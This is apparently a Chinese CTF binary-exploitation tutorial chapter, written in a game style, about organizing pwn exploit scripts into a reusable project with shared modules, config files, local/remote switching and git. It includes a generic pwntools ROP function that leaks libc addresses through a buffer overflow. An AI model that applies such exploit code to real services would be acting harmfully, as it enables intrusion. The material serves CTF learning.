# 第 16 关 · 脚本工程化：把作弊码写成套装

## 🎬 游戏开场

打了很多关卡后,你的桌面上可能堆了一堆 `exp1.py`、`exp2.py`、`exp_final.py`、`exp_final2.py`……每次打新题都从头复制粘贴,乱成一团。

这一关讲怎么把你的工具链**工程化**:建立清晰的目录结构、复用公共模块、管理不同题目的配置。让你的"作弊码"从散乱的便签,变成一套整洁的"装备套装"。

---

## 🧠 核心概念（游戏版）

### 1. 为什么要工程化?

- **复用**:泄露 libc、找 gadget 这些代码每道题都用,不该每次重写。
- **可维护**:题目参数(地址、偏移)集中管理,换了环境改一处就行。
- **可协作**:GitHub 上分享 exp,别人看得懂。

游戏比喻:与其每次出门现找装备,不如建一个"装备库",分类放好,出门直接拿。

### 2. 推荐的目录结构

```
pwn-workspace/
├── lib/                  # 公共模块
│   ├── utils.py          # 通用辅助函数(leak, menu交互)
│   └── gadgets.py        # gadget查找封装
├── challenges/           # 按题目分目录
│   ├── challenge1/
│   │   ├── exp.py
│   │   ├── vuln
│   │   └── libc.so.6
│   └── challenge2/
├── templates/            # exp模板
│   └── ret2libc_template.py
└── README.md
```

### 3. 公共模块示例

```python
# lib/utils.py
from pwn import *

def leak_libc(io, elf, libc, puts_got, puts_plt, main_addr, offset):
    """通用泄露libc函数"""
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
    io.sendline(b'A'*offset + p64(pop_rdi) + p64(puts_got)
                + p64(puts_plt) + p64(main_addr))
    io.recvline()
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    return leak - libc.sym['puts']

# 以后每道题直接 import
```

### 4. 配置与代码分离

把题目相关的地址、偏移放到配置文件:

```python
# config.py
BINARY = './vuln'
OFFSET = 24
LIBC = './libc.so.6'
REMOTE = ('chall.example.com', 10001)
```

exp.py 只写逻辑,参数从 config 读。这样换题目只改 config。

### 5. 调试与远程切换

用一个开关控制本地/远程:

```python
LOCAL = True
if LOCAL:
    io = process(BINARY)
else:
    io = remote(*REMOTE)
context.log_level = 'debug' if LOCAL else 'info'
```

### 6. 版本控制

用 Git 管理你的 exp 仓库:

```bash
git init
git add .
git commit -m "add exp for challenge1"
```

每次过关提交一次,改动可追溯,还能 push 到 GitHub 当笔记。

## 🎯 本关任务:整理你的 exp 库

把之前写的几个 exp 整理成上面的目录结构:

1. 抽出公共函数到 `lib/utils.py`。
2. 把参数移到 `config.py`。
3. 加本地/远程切换开关。
4. git init 并提交。

整理后,你会发现打新题的速度明显变快——因为基础设施已经就绪。
